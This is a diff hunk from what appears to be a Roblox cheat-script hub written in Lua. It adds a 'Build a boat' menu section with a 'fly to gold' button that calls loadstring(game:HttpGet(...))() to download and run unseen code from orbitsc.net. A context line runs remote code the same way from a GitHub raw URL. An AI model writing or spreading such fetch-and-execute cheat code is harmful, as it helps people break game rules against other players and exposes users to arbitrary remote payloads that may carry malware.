@@ -3961,8 +3961,22 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/HexFG/duckhub/refs/he
         end):setTooltip('PERFECT!')
 
 
-
-
+    local section = menu:addSection({
+        text = 'Build a boat', -- Title of section
+        side = 'auto', -- Side of the menu that the section is placed on. Defaults to 'auto', but can be 'left' or 'right'
+        showMinButton = true, -- Ability to minimize this section. Defaults to true
+    })
+				        		        section:addButton({
+            text = 'fly to gold', 
+            style = 'large' -- style of the button, can be 'large' or 'small'
+        }, function()
+loadstring(game:HttpGet("https://orbitsc.net/babft"))()
+            ui.notify({
+                title = 'get',
+                message = 'Open!',
+                duration = 3
+            })
+        end):setTooltip('PERFECT!')
 
 
 
